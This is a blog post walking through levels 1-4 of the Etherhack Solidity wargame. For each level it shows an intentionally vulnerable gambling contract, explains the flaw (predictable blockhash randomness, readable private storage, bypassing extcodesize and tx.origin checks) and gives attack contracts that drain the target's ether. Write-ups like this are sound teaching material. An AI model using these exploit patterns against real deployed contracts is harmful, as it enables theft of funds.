
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="author" content="F3real" />
        <meta name="keywords" content="ctf,ethereum,solidity" />
        <meta name="description" content="How to solve Etherhacker wargame lvl 1-4" />


    <title>Etherhacker wargame Lvl. 1-4 - EnSec blog</title>

    <link href="https://f3real.github.io/theme/css/combined.css" rel="stylesheet" />

    <!-- Feeds -->
</head>
<body data-spy="scroll" data-target="#scrollspy">
    <div id="wrapper">
        <!-- Sidebar -->
        <nav id="sidebar-wrapper-small" class="twitchy-background">
            <ul id="accordion-small" class="sidebar-nav sidebar-nav-small">
                <li>
        <a href="https://f3real.github.io" title="EnSec blog" class="collapsed">
            <span class="fas fa-home"></span>
        </a>
    </li>
                <li class="nav-divider"></li>
                <li>
        <a href="https://f3real.github.io/archives.html" title="Recent Articles" class="collapsed">
            <span class="fas fa-th-list"></span>
        </a>
    </li>
                <li class="nav-divider"></li>
                <li>
                    <a data-toggle="collapse" data-parent="#accordion-small" href="#collapse-social-small" title="Social" class="collapsed">
                        <i class="fas fa-users padding-small"></i>
                    </a>
                </li>
                <li class="panel anti-panel"><ul id="collapse-social-small" class="collapse ">
                    <li>
                        <a href="https://github.com/F3real" title="Github"><i class="fab fa-github-square padding-small"></i></a>
                    </li>
                    <li>
                        <a href="https://www.linkedin.com/in/stefan-ili%C4%87-61a004111" title="Linkedin"><i class="fab fa-linkedin padding-small"></i></a>
                    </li>
                </ul></li>
                <li class="nav-divider"></li>
                <li>
        <a href="#" title="Back to top" class="collapsed">
            <span class="fas fa-arrow-up"></span>
        </a>
    </li>
            </ul>
        </nav>
        <nav id="sidebar-wrapper" class="twitchy-background">
            <ul id="accordion" class="sidebar-nav">
                <li class="sidebar-brand">
                    <a href="https://f3real.github.io/">
                            <span class="fas fa-home padding-small"></span>
                            EnSec blog
                    </a>
                </li>
                    <li>
                        <a href="https://f3real.github.io/archives.html">
                            <span class="fas fa-th-list padding-small"></span>
                            Archives
                        </a>
                    </li>
                <li class="nav-divider"></li>
                <li>
                    <a data-toggle="collapse" data-parent="#accordion" href="#collapse-social">
                        <i class="fas fa-users padding-small"></i>
                        Contact
                    </a>
                </li>
                <li class="panel anti-panel"><ul id="collapse-social" class="sidebar_submenu collapse ">
                    <li>
                        <a href="https://github.com/F3real" title="Github">
                            <i class="fab fa-github-square padding-small"></i>
                            Github
                        </a>
                    </li>
                    <li>
                        <a href="https://www.linkedin.com/in/stefan-ili%C4%87-61a004111" title="Linkedin">
                            <i class="fab fa-linkedin padding-small"></i>
                            Linkedin
                        </a>
                    </li>
                </ul></li>
                
                <li class="nav-divider"></li>
                <li class="panel anti-panel"><ul id="collapse-pages" class="sidebar_submenu collapse ">
                </ul></li>
                <li class="nav-divider"></li>
                <li>
                    <a data-toggle="collapse" data-parent="#accordion" href="#collapse-categories">
                        <i class="fas fa-folder-open padding-small"></i>
                        Categories
                    </a>
                </li>
                <li class="panel anti-panel"><ul id="collapse-categories" class="sidebar_submenu collapse ">
                    <li class="active">
                        <a href="https://f3real.github.io/category/ctf.html">
                            <i class="fas fa-folder-open padding-small"></i>
                            ctf
                            <span class="badge badge-secondary float-right categorybadge">28</span>
                        </a>
                    </li>
                    <li >
                        <a href="https://f3real.github.io/category/misc.html">
                            <i class="fas fa-folder-open padding-small"></i>
                            misc
                            <span class="badge badge-secondary float-right categorybadge">15</span>
                        </a>
                    </li>
                    <li >
                        <a href="https://f3real.github.io/category/reversing.html">
                            <i class="fas fa-folder-open padding-small"></i>
                            reversing
                            <span class="badge badge-secondary float-right categorybadge">6</span>
                        </a>
                    </li>
                    <li >
                        <a href="https://f3real.github.io/category/tutorial.html">
                            <i class="fas fa-folder-open padding-small"></i>
                            tutorial
                            <span class="badge badge-secondary float-right categorybadge">5</span>
                        </a>
                    </li>
                </ul></li>
            </ul>
        </nav>
        <!-- /#sidebar-wrapper -->
        <!-- open/close sidebar -->
        <button onclick="toggleMenu();return false;" class="btn btn-primary" id="menu-toggle">
            <span id="right-arrow" class="fas fa-chevron-right"  title="expand sidebar"></span>
            <span id="left-arrow" class="fas fa-chevron-left" title="minimize sidebar"></span>
        </button>
       <!-- /open/close sidebar -->

        <!-- Page Content -->
        <div id="page-content-wrapper">
            <div class="container-fluid">
<section id="content">
    <article>
        <div class="row">
            <div class="col-lg-10">
                <header class="page-header">
                    <h1>
                        <a href="https://f3real.github.io/Etherhacker_wargame.html"
                           rel="bookmark"
                           title="Permalink to Etherhacker wargame Lvl. 1-4">
                            Etherhacker wargame Lvl. 1-4
                        </a>
                        <small>
<div class="post-info">
    <div class="publish-info-block">
        <small>
            <span class="published">
                <i class="fa fa-calendar padding-small"></i><time datetime="2019-01-14T10:01:00+01:00"> Mon 14 January 2019</time>
            </span>
            <span class="category">
                <i class="fa fa-folder-open padding-small"></i><a href="https://f3real.github.io/category/ctf.html">ctf</a>
            </span>
            <span class="tags">
                <i class="fa fa-tags padding-small"></i>
                <a href="https://f3real.github.io/tag/ctf.html">ctf</a> /                 <a href="https://f3real.github.io/tag/ethereum.html">ethereum</a> /                 <a href="https://f3real.github.io/tag/solidity.html">solidity</a>            </span>
        </small>
    </div>
</div><!-- /.post-info -->                        </small>
                    </h1>
                </header>
            </div>
        </div>
        <div class="row">
            <div class="col-lg-10">
                <div class="entry-content">
                    <p>Let's take a look at another interesting wargame based on solidity.
It can be found <a href="https://etherhack.positive.com/#/">here</a></p>
<div class="toc">
<ul>
<li><a href="#azino-777">Azino 777</a></li>
<li><a href="#private-ryan">Private Ryan</a></li>
<li><a href="#wheel-of-fortune">Wheel Of Fortune</a></li>
<li><a href="#call-me-maybe">Call Me Maybe</a></li>
</ul>
</div>
<h2 id="azino-777">Azino 777</h2>
<div class="highlight"><pre><span></span><code><span class="k">pragma solidity</span><span class="w"> </span><span class="o">^</span><span class="k">0.4.16</span><span class="p">;</span>

<span class="k">contract</span><span class="w"> </span><span class="ni">Azino777</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="kt">function</span><span class="w"> </span><span class="nv">spin</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">bet</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">require</span><span class="p">(</span><span class="k">msg.value</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">.</span><span class="m m-Decimal">01</span><span class="w"> </span>ether<span class="p">);</span>
<span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">num</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>rand<span class="p">(</span><span class="m m-Decimal">100</span><span class="p">);</span>
<span class="w">    </span><span class="kt">if</span><span class="p">(</span>num<span class="w"> </span><span class="o">==</span><span class="w"> </span>bet<span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">msg.sender</span><span class="p">.</span>transfer<span class="p">(</span><span class="kt">this</span><span class="p">.</span>balance<span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="c1">//Generate random number between 0 &amp; max</span>
<span class="w">  </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">constant</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span>FACTOR<span class="w"> </span><span class="o">=</span><span class="w">  </span><span class="m m-Decimal">1157920892373161954235709850086879078532699846656405640394575840079131296399</span><span class="p">;</span>
<span class="w">  </span><span class="kt">function</span><span class="w"> </span><span class="nv">rand</span><span class="p">(</span><span class="kt">uint</span><span class="w"> </span><span class="nv">max</span><span class="p">)</span><span class="w"> </span><span class="kt">constant</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">result</span><span class="p">){</span>
<span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">factor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>FACTOR<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="m m-Decimal">100</span><span class="w"> </span><span class="o">/</span><span class="w"> </span>max<span class="p">;</span>
<span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">lastBlockNumber</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">block.number</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="p">;</span>
<span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">hashVal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">uint256</span><span class="p">(</span><span class="k">block.blockhash</span><span class="p">(</span>lastBlockNumber<span class="p">));</span>

<span class="w">    </span><span class="kt">return</span><span class="w"> </span><span class="kt">uint256</span><span class="p">((</span><span class="kt">uint256</span><span class="p">(</span>hashVal<span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span>factor<span class="p">))</span><span class="w"> </span><span class="o">%</span><span class="w"> </span>max<span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kt">function</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{}</span>
<span class="p">}</span>
</code></pre></div>

<p>We need to call <code>spin</code> function with a correct bet. We see that it will be calculated based on <code>block.number - 1</code> in <code>random</code> function. To finish this challenge easily we just need to create a contract with the same random function. Transactions are going to execute in the same block (and share the same block variables) so both our contract and the target will generate a same random number.</p>
<p>We can convert address of contract to proper form from console using:</p>
<div class="highlight"><pre><span></span><code><span class="nx">web3</span><span class="p">.</span><span class="nx">toChecksumAddress</span><span class="p">(</span><span class="s2">&quot;&lt;contract_instance&gt;&quot;</span><span class="p">)</span>
</code></pre></div>

<p>Solution:</p>
<div class="highlight"><pre><span></span><code><span class="w">  </span><span class="p">...</span>
<span class="w">  </span>Azino777<span class="w"> </span>target<span class="w"> </span><span class="o">=</span><span class="w"> </span>Azino777<span class="p">(</span>targetAddress<span class="p">);</span><span class="w"> </span>

<span class="w">  </span><span class="kt">function</span><span class="w"> </span><span class="nv">attack</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">require</span><span class="p">(</span><span class="k">msg.value</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">.</span><span class="m m-Decimal">01</span><span class="w"> </span>ether<span class="p">);</span>
<span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">num</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>rand<span class="p">(</span><span class="m m-Decimal">100</span><span class="p">);</span>
<span class="w">    </span>target<span class="p">.</span>spin<span class="p">.</span>value<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">.</span><span class="m m-Decimal">01</span><span class="w"> </span>ether<span class="p">)(</span>num<span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="p">...</span>
</code></pre></div>

<h2 id="private-ryan">Private Ryan</h2>
<div class="highlight"><pre><span></span><code><span class="k">pragma solidity</span><span class="w"> </span><span class="o">^</span><span class="k">0.4.16</span><span class="p">;</span>

<span class="k">contract</span><span class="w"> </span><span class="ni">PrivateRyan</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kt">uint</span><span class="w"> </span><span class="k">private </span><span class="nv">seed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="p">;</span>

<span class="w">  </span><span class="kt">function</span><span class="w"> </span><span class="nv">PrivateRyan</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span>seed<span class="w"> </span><span class="o">=</span><span class="w"> </span>rand<span class="p">(</span><span class="m m-Decimal">256</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kt">function</span><span class="w"> </span><span class="nv">spin</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">bet</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">require</span><span class="p">(</span><span class="k">msg.value</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">.</span><span class="m m-Decimal">01</span><span class="w"> </span>ether<span class="p">);</span>
<span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">num</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>rand<span class="p">(</span><span class="m m-Decimal">100</span><span class="p">);</span>
<span class="w">    </span>seed<span class="w"> </span><span class="o">=</span><span class="w"> </span>rand<span class="p">(</span><span class="m m-Decimal">256</span><span class="p">);</span>
<span class="w">    </span><span class="kt">if</span><span class="p">(</span>num<span class="w"> </span><span class="o">==</span><span class="w"> </span>bet<span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">msg.sender</span><span class="p">.</span>transfer<span class="p">(</span><span class="kt">this</span><span class="p">.</span>balance<span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="c1">//Generate random number between 0 &amp; max</span>
<span class="w">  </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">constant</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span>FACTOR<span class="w"> </span><span class="o">=</span><span class="w">  </span><span class="m m-Decimal">1157920892373161954235709850086879078532699846656405640394575840079131296399</span><span class="p">;</span>
<span class="w">  </span><span class="kt">function</span><span class="w"> </span><span class="nv">rand</span><span class="p">(</span><span class="kt">uint</span><span class="w"> </span><span class="nv">max</span><span class="p">)</span><span class="w"> </span><span class="kt">constant</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">result</span><span class="p">){</span>
<span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">factor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>FACTOR<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="m m-Decimal">100</span><span class="w"> </span><span class="o">/</span><span class="w"> </span>max<span class="p">;</span>
<span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">blockNumber</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">block.number</span><span class="w"> </span><span class="o">-</span><span class="w"> </span>seed<span class="p">;</span>
<span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">hashVal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">uint256</span><span class="p">(</span><span class="k">block.blockhash</span><span class="p">(</span>blockNumber<span class="p">));</span>

<span class="w">    </span><span class="kt">return</span><span class="w"> </span><span class="kt">uint256</span><span class="p">((</span><span class="kt">uint256</span><span class="p">(</span>hashVal<span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span>factor<span class="p">))</span><span class="w"> </span><span class="o">%</span><span class="w"> </span>max<span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kt">function</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{}</span>
<span class="p">}</span>
</code></pre></div>

<p>It is almost the same challenge, but this time there is also random seed being used in calculating correct guess. We need to read it from contract storage before we create our contract to finish this challenge.</p>
<div class="highlight"><pre><span></span><code><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span>
<span class="w">  </span><span class="nx">instanceAddress</span><span class="p">,</span><span class="w"> </span>
<span class="w">  </span><span class="mf">0</span><span class="p">,</span><span class="w">        </span><span class="c1">//storage slot</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">((</span><span class="nx">web3</span><span class="p">.</span><span class="nx">toHex</span><span class="p">(</span><span class="nx">result</span><span class="p">)));</span><span class="w"> </span>
<span class="w">  </span><span class="p">}</span>
<span class="p">);</span>
</code></pre></div>

<p>Solution:</p>
<div class="highlight"><pre><span></span><code><span class="w">  </span>PrivateRyan<span class="w"> </span>target<span class="w"> </span><span class="o">=</span><span class="w"> </span>PrivateRyan<span class="p">(</span>targetAddress<span class="p">);</span>

<span class="w">  </span><span class="kt">function</span><span class="w"> </span><span class="nv">attack</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">_seed</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">require</span><span class="p">(</span><span class="k">msg.value</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">.</span><span class="m m-Decimal">01</span><span class="w"> </span>ether<span class="p">);</span>
<span class="w">    </span>seed<span class="w"> </span><span class="o">=</span><span class="w"> </span>_seed<span class="p">;</span>
<span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">num</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>rand<span class="p">(</span><span class="m m-Decimal">100</span><span class="p">);</span>
<span class="w">    </span>target<span class="p">.</span>spin<span class="p">.</span>value<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">.</span><span class="m m-Decimal">01</span><span class="w"> </span>ether<span class="p">)(</span>num<span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
</code></pre></div>

<h2 id="wheel-of-fortune">Wheel Of Fortune</h2>
<div class="highlight"><pre><span></span><code><span class="k">pragma solidity</span><span class="w"> </span><span class="o">^</span><span class="k">0.4.16</span><span class="p">;</span>

<span class="k">contract</span><span class="w"> </span><span class="ni">WheelOfFortune</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span>Game<span class="p">[]</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span>games<span class="p">;</span>

<span class="w">  </span><span class="kt">struct</span><span class="w"> </span><span class="nv">Game</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="kt">address</span><span class="w"> </span><span class="nv">player</span><span class="p">;</span>
<span class="w">      </span><span class="kt">uint</span><span class="w"> </span><span class="nv">id</span><span class="p">;</span>
<span class="w">      </span><span class="kt">uint</span><span class="w"> </span><span class="nv">bet</span><span class="p">;</span>
<span class="w">      </span><span class="kt">uint</span><span class="w"> </span><span class="nv">blockNumber</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kt">function</span><span class="w"> </span><span class="nv">spin</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">_bet</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">require</span><span class="p">(</span><span class="k">msg.value</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">.</span><span class="m m-Decimal">01</span><span class="w"> </span>ether<span class="p">);</span>
<span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">gameId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>games<span class="p">.</span>length<span class="p">;</span>
<span class="w">    </span>games<span class="p">.</span>length<span class="o">++</span><span class="p">;</span>
<span class="w">    </span>games<span class="p">[</span>gameId<span class="p">].</span>id<span class="w"> </span><span class="o">=</span><span class="w"> </span>gameId<span class="p">;</span>
<span class="w">    </span>games<span class="p">[</span>gameId<span class="p">].</span>player<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">msg.sender</span><span class="p">;</span>
<span class="w">    </span>games<span class="p">[</span>gameId<span class="p">].</span>bet<span class="w"> </span><span class="o">=</span><span class="w"> </span>_bet<span class="p">;</span>
<span class="w">    </span>games<span class="p">[</span>gameId<span class="p">].</span>blockNumber<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">block.number</span><span class="p">;</span>
<span class="w">    </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>gameId<span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="kt">uint</span><span class="w"> </span><span class="nv">lastGameId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>gameId<span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="p">;</span>
<span class="w">      </span><span class="kt">uint</span><span class="w"> </span><span class="nv">num</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>rand<span class="p">(</span><span class="k">block.blockhash</span><span class="p">(</span>games<span class="p">[</span>lastGameId<span class="p">].</span>blockNumber<span class="p">),</span><span class="w"> </span><span class="m m-Decimal">100</span><span class="p">);</span>
<span class="w">      </span><span class="kt">if</span><span class="p">(</span>num<span class="w"> </span><span class="o">==</span><span class="w"> </span>games<span class="p">[</span>lastGameId<span class="p">].</span>bet<span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">          </span>games<span class="p">[</span>lastGameId<span class="p">].</span>player<span class="p">.</span>transfer<span class="p">(</span><span class="kt">this</span><span class="p">.</span>balance<span class="p">);</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kt">function</span><span class="w"> </span><span class="nv">rand</span><span class="p">(</span><span class="kt">bytes32</span><span class="w"> </span><span class="nv">hash</span><span class="p">,</span><span class="w"> </span><span class="kt">uint</span><span class="w"> </span><span class="nv">max</span><span class="p">)</span><span class="w"> </span>pure<span class="w"> </span><span class="kt">private</span><span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">result</span><span class="p">){</span>
<span class="w">    </span><span class="kt">return</span><span class="w"> </span><span class="kt">uint256</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="kt">hash</span><span class="p">))</span><span class="w"> </span><span class="o">%</span><span class="w"> </span>max<span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kt">function</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{}</span>
<span class="p">}</span>
</code></pre></div>

<p>This time <code>blockhash</code> is used as a random number generator seed. We see that every new game entry checks if the previous entry guess was correct.</p>
<p>The <code>blockhash</code> of the current block, as a reminder, is always 0. </p>
<p>We can abuse this fact since there is nothing stopping us simply calling this function twice in a row from our contract and triggering the blockhash calculation for the current block.</p>
<p>Another way would be abusing the fact that <code>blockhash</code> is saved only for the last 256 blocks (older block number values will just return 0).</p>
<p>Solution:</p>
<div class="highlight"><pre><span></span><code><span class="w">  </span><span class="p">...</span>
<span class="w">  </span>WheelOfFortune<span class="w"> </span>target<span class="w"> </span><span class="o">=</span><span class="w"> </span>WheelOfFortune<span class="p">(</span>targetAddress<span class="p">);</span>

<span class="w">  </span><span class="kt">function</span><span class="w"> </span><span class="nv">attack</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">_bet</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">require</span><span class="p">(</span><span class="k">msg.value</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">.</span><span class="m m-Decimal">02</span><span class="w"> </span>ether<span class="p">);</span>
<span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">num</span><span class="w">  </span><span class="o">=</span><span class="w"> </span>rand<span class="p">(</span><span class="k">block.blockhash</span><span class="p">(</span><span class="k">block.number</span><span class="p">),</span><span class="w"> </span><span class="m m-Decimal">100</span><span class="p">);</span>
<span class="w">    </span>target<span class="p">.</span>spin<span class="p">.</span>value<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">.</span><span class="m m-Decimal">01</span><span class="w"> </span>ether<span class="p">)(</span>num<span class="p">);</span>
<span class="w">    </span>target<span class="p">.</span>spin<span class="p">.</span>value<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">.</span><span class="m m-Decimal">01</span><span class="w"> </span>ether<span class="p">)(</span>num<span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="p">...</span>
</code></pre></div>

<h2 id="call-me-maybe">Call Me Maybe</h2>
<div class="highlight"><pre><span></span><code><span class="k">contract</span><span class="w"> </span><span class="ni">CallMeMaybe</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">modifier</span><span class="w"> </span>CallMeMaybe<span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="kt">uint32</span><span class="w"> </span><span class="nv">size</span><span class="p">;</span>
<span class="w">      </span><span class="kt">address</span><span class="w"> </span><span class="nv">_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">msg.sender</span><span class="p">;</span>
<span class="w">      </span>assembly<span class="w"> </span><span class="p">{</span>
<span class="w">        </span>size<span class="w"> </span><span class="o">:=</span><span class="w"> </span>extcodesize<span class="p">(</span>_addr<span class="p">)</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">      </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>size<span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">          </span>revert<span class="p">();</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">      </span>_<span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">HereIsMyNumber</span><span class="p">()</span><span class="w"> </span>CallMeMaybe<span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kt">if</span><span class="p">(</span><span class="k">tx.origin</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="k">msg.sender</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span>revert<span class="p">();</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="kt">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">msg.sender</span><span class="p">.</span>transfer<span class="p">(</span><span class="kt">this</span><span class="p">.</span>balance<span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">function</span><span class="p">()</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{}</span>
<span class="p">}</span>
</code></pre></div>

<p>We have two different checks to bypass, first we have modifier <code>CallMeMaybe</code> which checks if the code size of <code>msg.sender</code> is greater then 0 and reverts. Second we have check that <code>tx.origin == msg.sender</code>.</p>
<p>Usually <code>tx.origin</code> is the same as <code>msg.sender</code>, but if there are chained calls they will differ. For example, if we have a chain of calls A -&gt; B -&gt; C, for C, <code>msg.sender</code> will be the address of B while <code>tx.origin</code> will be A.</p>
<p>To bypass these checks we will call the target contract from the constructor since during contract initialization code size is 0. This will also bypass second check since we will have  <code>wallet -&gt; attack contract -&gt; target contract</code>.</p>
<div class="highlight"><pre><span></span><code><span class="w">    </span>CallMeMaybe<span class="w"> </span>target<span class="w"> </span><span class="o">=</span><span class="w"> </span>CallMeMaybe<span class="p">(</span>targetAddress<span class="p">);</span>
<span class="w">    </span><span class="kt">constructor</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span>target<span class="p">.</span>HereIsMyNumber<span class="p">();</span>
<span class="w">    </span><span class="p">}</span><span class="w">    </span>
</code></pre></div>
                </div>
                <footer class="text-right">
                    <p>- F3real</p>
                </footer>
    <div id="show-comments" class="span7 text-center">
        <a href="https://f3real.github.io/Etherhacker_wargame.html#disqus_thread"
          data-disqus-identifier="Etherhacker_wargame"
        class="btn btn-primary twitchy-background">Show Comments</a>
    </div>
    <section id="comments" class="comments hidden">
        <hr/>
        <h2>Comments</h2>
        <div id="disqus_thread"></div>
        <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by
            Disqus.</a></noscript>
        <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
    </section>
            </div>
        </div>
    </article>
</section>
<footer>
    <hr>
    <div class="row">
        <div class="col-lg-10 text-center">
            <p><small>
                Built by <a href="http://docs.getpelican.com/en/latest">Pelican</a> / <a href="https://github.com/F3real/pelican-twitchy">pelican-twitchy</a>
                &middot;                    &copy; 2024 F3real
            </small></p>
        </div>
    </div>
</footer>            </div>
        </div>
        <!-- /#page-content-wrapper -->
    </div>
    <!-- /#wrapper -->

<!-- disqus -->
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'https-f3real-github-io'; // required: replace example with your forum shortname

            var disqus_identifier = 'Etherhacker_wargame';
        var disqus_url = 'https://f3real.github.io/Etherhacker_wargame.html';

    var disqus_config = function () {
        this.language = "en";
    };

        var commentsDiv = document.getElementById('show-comments');
        commentsDiv.onclick = function() {
